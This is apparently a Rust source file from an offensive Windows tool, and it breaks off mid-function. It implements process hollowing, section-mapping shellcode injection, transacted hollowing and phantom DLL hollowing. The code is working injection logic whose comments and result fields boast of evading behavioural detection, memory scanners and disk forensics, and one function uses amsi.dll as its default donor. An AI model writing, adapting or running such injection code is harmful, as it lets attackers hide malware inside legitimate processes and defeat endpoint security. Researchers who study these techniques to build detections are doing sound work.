//! Advanced process hollowing, mapping injection, phantom DLL hollowing, mockingjay
//! These techniques avoid common detection indicators (no VirtualAllocEx + WriteProcessMemory pattern)

use crate::error::MemoricError;
use crate::safe_handle::SafeHandle;
use serde_json::Value;

/// Process Hollowing (RunPE) — create suspended process, unmap original image, write malicious PE
pub fn process_hollow(args: &Value) -> Result<Value, MemoricError> {
    use windows::core::PWSTR;
    use windows::Win32::System::Diagnostics::Debug::{
        GetThreadContext, ReadProcessMemory, SetThreadContext, WriteProcessMemory, CONTEXT_FLAGS,
    };
    use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
    use windows::Win32::System::Memory::{
        VirtualAllocEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE,
    };
    use windows::Win32::System::Threading::{
        CreateProcessW, ResumeThread, CREATE_SUSPENDED, PROCESS_INFORMATION, STARTUPINFOW,
    };

    let target_exe = args
        .get("target_exe")
        .and_then(|v| v.as_str())
        .ok_or_else(|| {
            MemoricError::InjectionFailed(
                "Missing target_exe (legitimate process to hollow)".to_string(),
            )
        })?;
    let payload = args
        .get("payload")
        .and_then(|v| v.as_array())
        .ok_or_else(|| {
            MemoricError::InjectionFailed("Missing payload (PE bytes array)".to_string())
        })?;

    let pe_bytes: Vec<u8> = payload
        .iter()
        .filter_map(|v| v.as_u64().map(|b| b as u8))
        .collect();
    if pe_bytes.len() < 0x40 {
        return Err(MemoricError::InjectionFailed(
            "Payload too small for PE".to_string(),
        ));
    }

    // Validate DOS header
    if pe_bytes[0] != 0x4D || pe_bytes[1] != 0x5A {
        return Err(MemoricError::InjectionFailed(
            "Invalid PE: missing MZ signature".to_string(),
        ));
    }

    tracing::warn!(
        "[INJECT] Process Hollowing: target={} payload_size={}",
        target_exe,
        pe_bytes.len()
    );

    let _ = crate::privilege::debug::enable_debug_privilege(&serde_json::json!({}));

    unsafe {
        // Parse PE headers
        let e_lfanew = u32::from_le_bytes([
            pe_bytes[0x3C],
            pe_bytes[0x3D],
            pe_bytes[0x3E],
            pe_bytes[0x3F],
        ]) as usize;
        if e_lfanew + 0x58 > pe_bytes.len() {
            return Err(MemoricError::InjectionFailed(
                "Invalid PE: e_lfanew out of bounds".to_string(),
            ));
        }

        // Verify PE signature
        if pe_bytes[e_lfanew..e_lfanew + 4] != [0x50, 0x45, 0x00, 0x00] {
            return Err(MemoricError::InjectionFailed(
                "Invalid PE: missing PE signature".to_string(),
            ));
        }

        let image_base = u64::from_le_bytes(
            pe_bytes[e_lfanew + 0x30..e_lfanew + 0x38]
                .try_into()
                .unwrap(),
        );
        let size_of_image = u32::from_le_bytes(
            pe_bytes[e_lfanew + 0x50..e_lfanew + 0x54]
                .try_into()
                .unwrap(),
        );
        let size_of_headers = u32::from_le_bytes(
            pe_bytes[e_lfanew + 0x54..e_lfanew + 0x58]
                .try_into()
                .unwrap(),
        );
        let entry_point_rva = u32::from_le_bytes(
            pe_bytes[e_lfanew + 0x28..e_lfanew + 0x2C]
                .try_into()
                .unwrap(),
        );
        let num_sections = u16::from_le_bytes(
            pe_bytes[e_lfanew + 0x06..e_lfanew + 0x08]
                .try_into()
                .unwrap(),
        );
        let optional_header_size = u16::from_le_bytes(
            pe_bytes[e_lfanew + 0x14..e_lfanew + 0x16]
                .try_into()
                .unwrap(),
        );

        // Create suspended process
        let mut si: STARTUPINFOW = std::mem::zeroed();
        let mut pi: PROCESS_INFORMATION = std::mem::zeroed();
        si.cb = std::mem::size_of::<STARTUPINFOW>() as u32;

        let mut cmd_line: Vec<u16> = target_exe
            .encode_utf16()
            .chain(std::iter::once(0))
            .collect();

        CreateProcessW(
            None,
            PWSTR(cmd_line.as_mut_ptr()),
            None,
            None,
            false,
            CREATE_SUSPENDED,
            None,
            None,
            &si,
            &mut pi,
        )
        .map_err(|e| MemoricError::WindowsApi(format!("CreateProcess: {}", e)))?;

        let hprocess = SafeHandle::new(pi.hProcess);
        let hthread = SafeHandle::new(pi.hThread);

        // Get thread context to find PEB address
        let mut ctx: windows::Win32::System::Diagnostics::Debug::CONTEXT = std::mem::zeroed();
        ctx.ContextFlags = CONTEXT_FLAGS(0x10001F); // CONTEXT_FULL
        GetThreadContext(*hthread, &mut ctx)
            .map_err(|e| MemoricError::WindowsApi(format!("GetThreadContext: {}", e)))?;

        // RDX = PEB address in suspended process
        let peb_addr = ctx.Rdx;
        // Read ImageBaseAddress from PEB (offset 0x10)
        let mut orig_image_base: u64 = 0;
        ReadProcessMemory(
            *hprocess,
            (peb_addr + 0x10) as *const _,
            &mut orig_image_base as *mut u64 as *mut _,
            8,
            None,
        )
        .map_err(|e| MemoricError::WindowsApi(format!("ReadProcessMemory PEB: {}", e)))?;

        // NtUnmapViewOfSection to unmap original image
        let ntdll = GetModuleHandleA(windows::core::PCSTR(b"ntdll.dll\0".as_ptr()))
            .map_err(|e| MemoricError::WindowsApi(format!("ntdll: {}", e)))?;
        let nt_unmap = GetProcAddress(
            ntdll,
            windows::core::PCSTR(b"NtUnmapViewOfSection\0".as_ptr()),
        )
        .ok_or_else(|| MemoricError::WindowsApi("NtUnmapViewOfSection not found".to_string()))?;

        type NtUnmapFn = unsafe extern "system" fn(isize, *const std::ffi::c_void) -> i32;
        let nt_unmap: NtUnmapFn = std::mem::transmute(nt_unmap);
        let status = nt_unmap(hprocess.0 as isize, orig_image_base as *const _);
        if status < 0 {
            tracing::warn!(
                "NtUnmapViewOfSection returned 0x{:08X} — continuing anyway",
                status
            );
        }

        // Allocate memory at preferred image base
        let alloc_base = VirtualAllocEx(
            *hprocess,
            Some(image_base as *const _),
            size_of_image as usize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );
        let actual_base = if alloc_base.is_null() {
            // Try any address if preferred base unavailable
            let fallback = VirtualAllocEx(
                *hprocess,
                None,
                size_of_image as usize,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE,
            );
            if fallback.is_null() {
                return Err(MemoricError::InjectionFailed(
                    "VirtualAllocEx failed for PE image".to_string(),
                ));
            }
            fallback
        } else {
            alloc_base
        };

        // Write PE headers
        WriteProcessMemory(
            *hprocess,
            actual_base,
            pe_bytes.as_ptr() as *const _,
            size_of_headers as usize,
            None,
        )
        .map_err(|e| MemoricError::InjectionFailed(format!("WriteProcessMemory headers: {}", e)))?;

        // Write sections
        let section_offset = e_lfanew + 0x18 + optional_header_size as usize;
        for i in 0..num_sections as usize {
            let sec_hdr = section_offset + i * 40;
            if sec_hdr + 40 > pe_bytes.len() {
                break;
            }

            let virtual_address =
                u32::from_le_bytes(pe_bytes[sec_hdr + 12..sec_hdr + 16].try_into().unwrap());
            let size_of_raw_data =
                u32::from_le_bytes(pe_bytes[sec_hdr + 16..sec_hdr + 20].try_into().unwrap());
            let pointer_to_raw =
                u32::from_le_bytes(pe_bytes[sec_hdr + 20..sec_hdr + 24].try_into().unwrap());

            if size_of_raw_data == 0
                || pointer_to_raw as usize + size_of_raw_data as usize > pe_bytes.len()
            {
                continue;
            }

            let dest = (actual_base as usize + virtual_address as usize) as *mut _;
            let _ = WriteProcessMemory(
                *hprocess,
                dest,
                pe_bytes[pointer_to_raw as usize..].as_ptr() as *const _,
                size_of_raw_data as usize,
                None,
            );
        }

        // Update PEB.ImageBaseAddress
        let actual_base_val = actual_base as u64;
        WriteProcessMemory(
            *hprocess,
            (peb_addr + 0x10) as *mut _,
            &actual_base_val as *const u64 as *const _,
            8,
            None,
        )
        .map_err(|e| {
            MemoricError::InjectionFailed(format!("WriteProcessMemory PEB.ImageBase: {}", e))
        })?;

        // Set entry point in thread context
        ctx.Rcx = actual_base as u64 + entry_point_rva as u64;
        SetThreadContext(*hthread, &ctx)
            .map_err(|e| MemoricError::WindowsApi(format!("SetThreadContext: {}", e)))?;

        // Resume the hollowed process
        let _ = ResumeThread(*hthread);

        Ok(serde_json::json!({
            "success": true,
            "technique": "process_hollowing",
            "target_exe": target_exe,
            "pid": pi.dwProcessId,
            "tid": pi.dwThreadId,
            "original_image_base": format!("0x{:016X}", orig_image_base),
            "actual_base": format!("0x{:016X}", actual_base as u64),
            "preferred_image_base": format!("0x{:016X}", image_base),
            "entry_point": format!("0x{:016X}", actual_base as u64 + entry_point_rva as u64),
            "size_of_image": size_of_image,
            "sections_written": num_sections,
            "message": format!("Process hollowed: {} (PID {}) — original unmapped, PE injected at 0x{:016X}", target_exe, pi.dwProcessId, actual_base as u64)
        }))
    }
}

/// Mapping Injection — use NtCreateSection + NtMapViewOfSection for cross-process injection
/// No VirtualAllocEx + WriteProcessMemory pattern — evades many behavioral detections
pub fn mapping_inject(args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
    use windows::Win32::System::Threading::{
        CreateRemoteThread, OpenProcess, PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION,
        PROCESS_VM_OPERATION,
    };

    let pid = args
        .get("pid")
        .and_then(|v| v.as_u64())
        .ok_or_else(|| MemoricError::InjectionFailed("Missing pid".to_string()))?;
    let shellcode = args
        .get("shellcode")
        .and_then(|v| v.as_array())
        .ok_or_else(|| MemoricError::InjectionFailed("Missing shellcode".to_string()))?;

    let shellcode_bytes: Vec<u8> = shellcode
        .iter()
        .filter_map(|v| v.as_u64().map(|b| b as u8))
        .collect();
    if shellcode_bytes.is_empty() {
        return Err(MemoricError::InjectionFailed("Empty shellcode".to_string()));
    }

    tracing::warn!(
        "[INJECT] Mapping Injection: PID {} ({} bytes)",
        pid,
        shellcode_bytes.len()
    );

    let _ = crate::privilege::debug::enable_debug_privilege(&serde_json::json!({}));

    unsafe {
        let ntdll = GetModuleHandleA(windows::core::PCSTR(b"ntdll.dll\0".as_ptr()))
            .map_err(|e| MemoricError::WindowsApi(format!("ntdll: {}", e)))?;

        // Resolve native APIs
        let nt_create_section =
            GetProcAddress(ntdll, windows::core::PCSTR(b"NtCreateSection\0".as_ptr()))
                .ok_or_else(|| MemoricError::WindowsApi("NtCreateSection not found".to_string()))?;
        let nt_map_view = GetProcAddress(
            ntdll,
            windows::core::PCSTR(b"NtMapViewOfSection\0".as_ptr()),
        )
        .ok_or_else(|| MemoricError::WindowsApi("NtMapViewOfSection not found".to_string()))?;
        let nt_unmap_view = GetProcAddress(
            ntdll,
            windows::core::PCSTR(b"NtUnmapViewOfSection\0".as_ptr()),
        )
        .ok_or_else(|| MemoricError::WindowsApi("NtUnmapViewOfSection not found".to_string()))?;

        type NtCreateSectionFn = unsafe extern "system" fn(
            *mut isize,
            u32,
            *const std::ffi::c_void,
            *const i64,
            u32,
            u32,
            isize,
        ) -> i32;
        type NtMapViewFn = unsafe extern "system" fn(
            isize,
            isize,
            *mut *mut std::ffi::c_void,
            usize,
            usize,
            *const i64,
            *mut usize,
            u32,
            u32,
            u32,
        ) -> i32;

        let nt_create_section: NtCreateSectionFn = std::mem::transmute(nt_create_section);
        let nt_map_view: NtMapViewFn = std::mem::transmute(nt_map_view);

        // Create shared section
        let section_size: i64 = shellcode_bytes.len() as i64;
        let mut section_handle: isize = 0;

        // SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE = 0x0E
        let status = nt_create_section(
            &mut section_handle,
            0x0F, // SECTION_ALL_ACCESS
            std::ptr::null(),
            &section_size,
            0x40,       // PAGE_EXECUTE_READWRITE
            0x08000000, // SEC_COMMIT
            0,
        );
        if status < 0 {
            return Err(MemoricError::InjectionFailed(format!(
                "NtCreateSection: 0x{:08X}",
                status
            )));
        }

        // Map into local process (RW)
        let current_process = -1isize; // NtCurrentProcess()
        let mut local_view: *mut std::ffi::c_void = std::ptr::null_mut();
        let mut view_size: usize = 0;

        let status = nt_map_view(
            section_handle,
            current_process,
            &mut local_view,
            0,
            0,
            std::ptr::null(),
            &mut view_size,
            2, // ViewUnmap
            0,
            0x04, // PAGE_READWRITE
        );
        if status < 0 {
            return Err(MemoricError::InjectionFailed(format!(
                "NtMapViewOfSection (local): 0x{:08X}",
                status
            )));
        }

        // Write shellcode to local mapping (shared memory — no WriteProcessMemory needed)
        std::ptr::copy_nonoverlapping(
            shellcode_bytes.as_ptr(),
            local_view as *mut u8,
            shellcode_bytes.len(),
        );

        // Open remote process
        let hprocess = OpenProcess(
            PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION | PROCESS_CREATE_THREAD,
            false,
            pid as u32,
        )
        .map_err(|e| MemoricError::WindowsApi(format!("OpenProcess: {}", e)))?;
        let hprocess = SafeHandle::new(hprocess);

        // Map into remote process (RX)
        let mut remote_view: *mut std::ffi::c_void = std::ptr::null_mut();
        let mut remote_view_size: usize = 0;

        let status = nt_map_view(
            section_handle,
            hprocess.0 as isize,
            &mut remote_view,
            0,
            0,
            std::ptr::null(),
            &mut remote_view_size,
            2, // ViewUnmap
            0,
            0x20, // PAGE_EXECUTE_READ
        );
        if status < 0 {
            return Err(MemoricError::InjectionFailed(format!(
                "NtMapViewOfSection (remote): 0x{:08X}",
                status
            )));
        }

        // Unmap local view — shellcode only lives in remote process now
        let nt_unmap_view: unsafe extern "system" fn(isize, *const std::ffi::c_void) -> i32 =
            std::mem::transmute(nt_unmap_view);
        let _ = nt_unmap_view(current_process, local_view);

        // Execute via CreateRemoteThread
        let thread = CreateRemoteThread(
            *hprocess,
            None,
            0,
            Some(std::mem::transmute(remote_view)),
            None,
            0,
            None,
        )
        .map_err(|e| MemoricError::InjectionFailed(format!("CreateRemoteThread: {}", e)))?;

        // Close section handle
        windows::Win32::Foundation::CloseHandle(windows::Win32::Foundation::HANDLE(
            section_handle as *mut _,
        ))
        .map_err(|e| MemoricError::WindowsApi(format!("CloseHandle section: {}", e)))?;

        Ok(serde_json::json!({
            "success": true,
            "technique": "mapping_injection",
            "pid": pid,
            "remote_view": format!("0x{:016X}", remote_view as u64),
            "view_size": remote_view_size,
            "thread_handle": thread.0 as u64,
            "evasion_notes": [
                "No VirtualAllocEx call",
                "No WriteProcessMemory call",
                "Shared section — shellcode written locally, visible remotely",
                "Remote mapping is PAGE_EXECUTE_READ (not RWX)"
            ],
            "message": format!("Section mapped at 0x{:016X} in PID {} — no WPM/VAE indicators", remote_view as u64, pid)
        }))
    }
}

/// Transacted Hollowing — combine NTFS transaction + process hollowing
/// PE is loaded via transacted file operations — disk forensics sees nothing
pub fn transacted_hollow(args: &Value) -> Result<Value, MemoricError> {
    use windows::core::PWSTR;
    use windows::Win32::System::Diagnostics::Debug::{
        GetThreadContext, ReadProcessMemory, SetThreadContext, WriteProcessMemory, CONTEXT_FLAGS,
    };
    use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
    use windows::Win32::System::Threading::{
        CreateProcessW, ResumeThread, CREATE_SUSPENDED, PROCESS_INFORMATION, STARTUPINFOW,
    };

    let target_exe = args
        .get("target_exe")
        .and_then(|v| v.as_str())
        .ok_or_else(|| MemoricError::InjectionFailed("Missing target_exe".to_string()))?;
    let payload = args
        .get("payload")
        .and_then(|v| v.as_array())
        .ok_or_else(|| MemoricError::InjectionFailed("Missing payload (PE bytes)".to_string()))?;

    let pe_bytes: Vec<u8> = payload
        .iter()
        .filter_map(|v| v.as_u64().map(|b| b as u8))
        .collect();
    if pe_bytes.len() < 0x40 || pe_bytes[0] != 0x4D || pe_bytes[1] != 0x5A {
        return Err(MemoricError::InjectionFailed(
            "Invalid PE payload".to_string(),
        ));
    }

    tracing::warn!(
        "[INJECT] Transacted Hollowing: target={} payload_size={}",
        target_exe,
        pe_bytes.len()
    );

    let _ = crate::privilege::debug::enable_debug_privilege(&serde_json::json!({}));

    unsafe {
        let ntdll = GetModuleHandleA(windows::core::PCSTR(b"ntdll.dll\0".as_ptr()))
            .map_err(|e| MemoricError::WindowsApi(format!("ntdll: {}", e)))?;
        let ktmw32 = GetModuleHandleA(windows::core::PCSTR(b"ktmw32.dll\0".as_ptr()));

        // Try loading ktmw32 if not loaded
        let ktmw32 = match ktmw32 {
            Ok(h) => h,
            Err(_) => {
                use windows::Win32::System::LibraryLoader::LoadLibraryA;
                LoadLibraryA(windows::core::PCSTR(b"ktmw32.dll\0".as_ptr()))
                    .map_err(|e| MemoricError::WindowsApi(format!("LoadLibrary ktmw32: {}", e)))?
            }
        };

        let create_transaction = GetProcAddress(
            ktmw32,
            windows::core::PCSTR(b"CreateTransaction\0".as_ptr()),
        )
        .ok_or_else(|| MemoricError::WindowsApi("CreateTransaction not found".to_string()))?;
        let rollback_transaction = GetProcAddress(
            ktmw32,
            windows::core::PCSTR(b"RollbackTransaction\0".as_ptr()),
        )
        .ok_or_else(|| MemoricError::WindowsApi("RollbackTransaction not found".to_string()))?;

        type CreateTransactionFn = unsafe extern "system" fn(
            *const std::ffi::c_void,
            *const std::ffi::c_void,
            u32,
            u32,
            u32,
            u32,
            *const u16,
        ) -> isize;
        type RollbackTransactionFn = unsafe extern "system" fn(isize) -> i32;

        let create_transaction: CreateTransactionFn = std::mem::transmute(create_transaction);
        let rollback_transaction: RollbackTransactionFn = std::mem::transmute(rollback_transaction);

        // Create transaction
        let htxn = create_transaction(
            std::ptr::null(),
            std::ptr::null(),
            0,
            0,
            0,
            0,
            std::ptr::null(),
        );
        if htxn == -1 {
            return Err(MemoricError::WindowsApi(
                "CreateTransaction failed".to_string(),
            ));
        }

        // CreateFileTransacted — write payload PE to a transacted file
        let create_file_txn = GetProcAddress(
            windows::Win32::System::LibraryLoader::GetModuleHandleA(windows::core::PCSTR(
                b"kernel32.dll\0".as_ptr(),
            ))
            .map_err(|e| MemoricError::WindowsApi(format!("kernel32: {}", e)))?,
            windows::core::PCSTR(b"CreateFileTransactedW\0".as_ptr()),
        )
        .ok_or_else(|| MemoricError::WindowsApi("CreateFileTransactedW not found".to_string()))?;

        type CreateFileTransactedFn = unsafe extern "system" fn(
            *const u16,
            u32,
            u32,
            *const std::ffi::c_void,
            u32,
            u32,
            isize,
            isize,
            *const std::ffi::c_void,
            *const std::ffi::c_void,
        ) -> isize;
        let create_file_txn: CreateFileTransactedFn = std::mem::transmute(create_file_txn);

        // Use temp file path
        let temp_path = format!(
            "{}\\txn_hollow_{}.exe",
            std::env::temp_dir().to_string_lossy(),
            std::process::id()
        );
        let temp_wide: Vec<u16> = temp_path.encode_utf16().chain(std::iter::once(0)).collect();

        let htxn_file = create_file_txn(
            temp_wide.as_ptr(),
            0xC0000000, // GENERIC_READ | GENERIC_WRITE
            0,
            std::ptr::null(),
            2,    // CREATE_ALWAYS
            0x80, // FILE_ATTRIBUTE_NORMAL
            0,
            htxn,
            std::ptr::null(),
            std::ptr::null(),
        );
        if htxn_file == -1 {
            let _ = rollback_transaction(htxn);
            return Err(MemoricError::WindowsApi(
                "CreateFileTransactedW failed".to_string(),
            ));
        }

        // Write PE to transacted file
        use windows::Win32::Storage::FileSystem::WriteFile;
        let mut written = 0u32;
        WriteFile(
            windows::Win32::Foundation::HANDLE(htxn_file as *mut _),
            Some(&pe_bytes),
            Some(&mut written),
            None,
        )
        .map_err(|e| {
            let _ = rollback_transaction(htxn);
            MemoricError::WindowsApi(format!("WriteFile: {}", e))
        })?;

        // Create section from transacted file
        let nt_create_section =
            GetProcAddress(ntdll, windows::core::PCSTR(b"NtCreateSection\0".as_ptr()))
                .ok_or_else(|| MemoricError::WindowsApi("NtCreateSection not found".to_string()))?;

        type NtCreateSectionFn = unsafe extern "system" fn(
            *mut isize,
            u32,
            *const std::ffi::c_void,
            *const i64,
            u32,
            u32,
            isize,
        ) -> i32;
        let nt_create_section: NtCreateSectionFn = std::mem::transmute(nt_create_section);

        let mut section_handle: isize = 0;
        let status = nt_create_section(
            &mut section_handle,
            0x0F,
            std::ptr::null(),
            std::ptr::null(),
            0x02,
            0x01000000,
            htxn_file,
        );
        // SEC_IMAGE = 0x01000000, PAGE_READONLY = 0x02

        // Close transacted file and rollback — file never persists on disk
        let _ = windows::Win32::Foundation::CloseHandle(windows::Win32::Foundation::HANDLE(
            htxn_file as *mut _,
        ));
        let _ = rollback_transaction(htxn);
        let _ = windows::Win32::Foundation::CloseHandle(windows::Win32::Foundation::HANDLE(
            htxn as *mut _,
        ));

        if status < 0 {
            return Err(MemoricError::InjectionFailed(format!(
                "NtCreateSection (SEC_IMAGE): 0x{:08X}",
                status
            )));
        }

        // Now create the suspended process and hollow it with the section
        let mut si: STARTUPINFOW = std::mem::zeroed();
        let mut pi: PROCESS_INFORMATION = std::mem::zeroed();
        si.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
        let mut cmd_line: Vec<u16> = target_exe
            .encode_utf16()
            .chain(std::iter::once(0))
            .collect();

        CreateProcessW(
            None,
            PWSTR(cmd_line.as_mut_ptr()),
            None,
            None,
            false,
            CREATE_SUSPENDED,
            None,
            None,
            &si,
            &mut pi,
        )
        .map_err(|e| MemoricError::WindowsApi(format!("CreateProcess: {}", e)))?;

        let hprocess = SafeHandle::new(pi.hProcess);
        let hthread = SafeHandle::new(pi.hThread);

        // Get original image base from PEB
        let mut ctx: windows::Win32::System::Diagnostics::Debug::CONTEXT = std::mem::zeroed();
        ctx.ContextFlags = CONTEXT_FLAGS(0x10001F); // CONTEXT_FULL
        GetThreadContext(*hthread, &mut ctx)
            .map_err(|e| MemoricError::WindowsApi(format!("GetThreadContext: {}", e)))?;

        let peb_addr = ctx.Rdx;
        let mut orig_base: u64 = 0;
        let _ = ReadProcessMemory(
            *hprocess,
            (peb_addr + 0x10) as *const _,
            &mut orig_base as *mut u64 as *mut _,
            8,
            None,
        );

        // Unmap original image
        let nt_unmap = GetProcAddress(
            ntdll,
            windows::core::PCSTR(b"NtUnmapViewOfSection\0".as_ptr()),
        )
        .unwrap();
        let nt_unmap: unsafe extern "system" fn(isize, *const std::ffi::c_void) -> i32 =
            std::mem::transmute(nt_unmap);
        let _ = nt_unmap(hprocess.0 as isize, orig_base as *const _);

        // Map the transacted section into the process
        let nt_map = GetProcAddress(
            ntdll,
            windows::core::PCSTR(b"NtMapViewOfSection\0".as_ptr()),
        )
        .unwrap();
        type NtMapFn = unsafe extern "system" fn(
            isize,
            isize,
            *mut *mut std::ffi::c_void,
            usize,
            usize,
            *const i64,
            *mut usize,
            u32,
            u32,
            u32,
        ) -> i32;
        let nt_map: NtMapFn = std::mem::transmute(nt_map);

        let mut remote_base: *mut std::ffi::c_void = std::ptr::null_mut();
        let mut view_size: usize = 0;
        let status = nt_map(
            section_handle,
            hprocess.0 as isize,
            &mut remote_base,
            0,
            0,
            std::ptr::null(),
            &mut view_size,
            2,
            0,
            0x02,
        );

        let _ = windows::Win32::Foundation::CloseHandle(windows::Win32::Foundation::HANDLE(
            section_handle as *mut _,
        ));

        if status < 0 {
            return Err(MemoricError::InjectionFailed(format!(
                "NtMapViewOfSection: 0x{:08X}",
                status
            )));
        }

        // Parse entry point from payload
        let e_lfanew = u32::from_le_bytes([
            pe_bytes[0x3C],
            pe_bytes[0x3D],
            pe_bytes[0x3E],
            pe_bytes[0x3F],
        ]) as usize;
        let entry_rva = u32::from_le_bytes(
            pe_bytes[e_lfanew + 0x28..e_lfanew + 0x2C]
                .try_into()
                .unwrap(),
        );

        // Update PEB ImageBase + thread entry point
        let new_base = remote_base as u64;
        let _ = WriteProcessMemory(
            *hprocess,
            (peb_addr + 0x10) as *mut _,
            &new_base as *const u64 as *const _,
            8,
            None,
        );

        ctx.Rcx = new_base + entry_rva as u64;
        SetThreadContext(*hthread, &ctx)
            .map_err(|e| MemoricError::WindowsApi(format!("SetThreadContext: {}", e)))?;

        let _ = ResumeThread(*hthread);

        Ok(serde_json::json!({
            "success": true,
            "technique": "transacted_hollowing",
            "target_exe": target_exe,
            "pid": pi.dwProcessId,
            "mapped_base": format!("0x{:016X}", new_base),
            "entry_point": format!("0x{:016X}", new_base + entry_rva as u64),
            "evasion_notes": [
                "PE loaded via NTFS transaction",
                "Transaction rolled back — file never persisted on disk",
                "SEC_IMAGE section — OS loads PE properly with relocations"
            ],
            "message": format!("Transacted hollow complete: PID {} running payload from 0x{:016X}", pi.dwProcessId, new_base)
        }))
    }
}

/// Phantom DLL Hollowing — map a legitimate DLL as image section, overwrite .text with shellcode
/// Evades memory scanners since the section is backed by a known DLL
pub fn phantom_dll_hollow(args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::Storage::FileSystem::{
        CreateFileW, FILE_ATTRIBUTE_NORMAL, FILE_GENERIC_READ, FILE_SHARE_READ, OPEN_EXISTING,
    };
    use windows::Win32::System::Diagnostics::Debug::{ReadProcessMemory, WriteProcessMemory};
    use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
    use windows::Win32::System::Memory::{VirtualProtectEx, PAGE_EXECUTE_READ, PAGE_READWRITE};
    use windows::Win32::System::Threading::{
        CreateRemoteThread, OpenProcess, PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION,
        PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE,
    };

    let pid = args
        .get("pid")
        .and_then(|v| v.as_u64())
        .ok_or_else(|| MemoricError::InjectionFailed("Missing pid".to_string()))?;
    let shellcode = args
        .get("shellcode")
        .and_then(|v| v.as_array())
        .ok_or_else(|| MemoricError::InjectionFailed("Missing shellcode".to_string()))?;
    let donor_dll = args
        .get("donor_dll")
        .and_then(|v| v.as_str())
        .unwrap_or("C:\\Windows\\System32\\amsi.dll");

    let shellcode_bytes: Vec<u8> = shellcode
        .iter()
        .filter_map(|v| v.as_u64().map(|b| b as u8))
        .collect();
    if shellcode_bytes.is_empty() {
        return Err(MemoricError::InjectionFailed("Empty shellcode".to_string()));
    }

    tracing::warn!(
        "[INJECT] Phantom DLL Hollowing: PID {} donor={} ({} bytes)",
        pid,
        donor_dll,
        shellcode_bytes.len()
    );

    let _ = crate::privilege::debug::enable_debug_privilege(&serde_json::json!({}));

    unsafe {
        let ntdll = GetModuleHandleA(windows::core::PCSTR(b"ntdll.dll\0".as_ptr()))
            .map_err(|e| MemoricError::WindowsApi(format!("ntdll: {}", e)))?;

        // Open the donor DLL file
        let dll_wide: Vec<u16> = donor_dll.encode_utf16().chain(std::iter::once(0)).collect();
        let hfile = CreateFileW(
            windows::core::PCWSTR(dll_wide.as_ptr()),
            FILE_GENERIC_READ.0,
            FILE_SHARE_READ,
            None,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            None,
        )
        .map_err(|e| MemoricError::WindowsApi(format!("CreateFileW donor: {}", e)))?;
        let hfile = SafeHandle::new(hfile);

        // Create SEC_IMAGE section from the DLL
        let nt_create_section =
            GetProcAddress(ntdll, windows::core::PCSTR(b"NtCreateSection\0".as_ptr())).unwrap();
        type NtCreateSectionFn = unsafe extern "system" fn(
            *mut isize,
            u32,
            *const std::ffi::c_void,
            *const i64,
            u32,
            u32,
            isize,
        ) -> i32;
        let nt_create_section: NtCreateSectionFn = std::mem::transmute(nt_create_section);

        let mut section_handle: isize = 0;
        let status = nt_create_section(
            &mut section_handle,
            0x0F,
            std::ptr::null(),
            std::ptr::null(),
            0x02,
            0x01000000,
            hfile.0 as isize,
        );
        if status < 0 {
            return Err(MemoricError::InjectionFailed(format!(
                "NtCreateSection SEC_IMAGE: 0x{:08X}",
                status
            )));
        }

        // Map into remote process
        let hprocess = OpenProcess(
            PROCESS_VM_WRITE
                | PROCESS_VM_OPERATION
                | PROCESS_VM_READ
                | PROCESS_QUERY_INFORMATION
                | PROCESS_CREATE_THREAD,
            false,
            pid as u32,
        )
        .map_err(|e| MemoricError::WindowsApi(format!("OpenProcess: {}", e)))?;
        let hprocess = SafeHandle::new(hprocess);

        let nt_map = GetProcAddress(
            ntdll,
            windows::core::PCSTR(b"NtMapViewOfSection\0".as_ptr()),
        )
        .unwrap();
        type NtMapFn = unsafe extern "system" fn(
            isize,
            isize,
            *mut *mut std::ffi::c_void,
            usize,
            usize,
            *const i64,
            *mut usize,
            u32,
            u32,
            u32,
        ) -> i32;
        let nt_map: NtMapFn = std::mem::transmute(nt_map);

        let mut remote_base: *mut std::ffi::c_void = std::ptr::null_mut();
        let mut view_size: usize = 0;
        let status = nt_map(
            section_handle,
            hprocess.0 as isize,
            &mut remote_base,
            0,
            0,
            std::ptr::null(),
            &mut view_size,
            2,
            0,
            0x20,
        );

        let _ = windows::Win32::Foundation::CloseHandle(windows::Win32::Foundation::HANDLE(
            section_handle as *mut _,
        ));

        if status < 0 {
            return Err(MemoricError::InjectionFailed(format!(
                "NtMapViewOfSection: 0x{:08X}",
                status
            )));
        }

        // Read the PE headers from the remote mapped DLL to find .text section
        let mut dos_header = [0u8; 0x40];
        let _ = ReadProcessMemory(
            *hprocess,
            remote_base,
            dos_header.as_mut_ptr() as *mut _,
            0x40,
            None,
        );
        let e_lfanew = u32::from_le_bytes([
            dos_header[0x3C],
            dos_header[0x3D],
            dos_header[0x3E],
            dos_header[0x3F],
        ]) as usize;

        let mut pe_header = vec![0u8; 0x200];
        let _ = ReadProcessMemory(
            *hprocess,
            (remote_base as usize + e_lfanew) as *const _,
            pe_header.as_mut_ptr() as *mut _,
            0x200,
            None,
        );

        let num_sections = u16::from_le_bytes([pe_header[6], pe_header[7]]);
        let optional_size = u16::from_le_bytes([pe_header[0x14], pe_header[0x15]]);
        let section_start = 0x18 + optional_size as usize;

        // Find .text section
        let mut text_rva = 0u32;
        let mut text_size = 0u32;
        for i in 0..num_sections as usize {
            let off = section_start + i * 40;
            if off + 40 > pe_header.len() {
                break;
            }
            let name = &pe_header[off..off + 8];
            if name.starts_with(b".text") {
                text_rva = u32::from_le_bytes(pe_header[off + 12..off + 16].try_into().unwrap());
                text_size = u32::from_le_bytes(pe_header[off + 8..off + 12].try_into().unwrap());
                break;
            }
        }

        if text_rva == 0 {
            return Err(MemoricError::InjectionFailed(
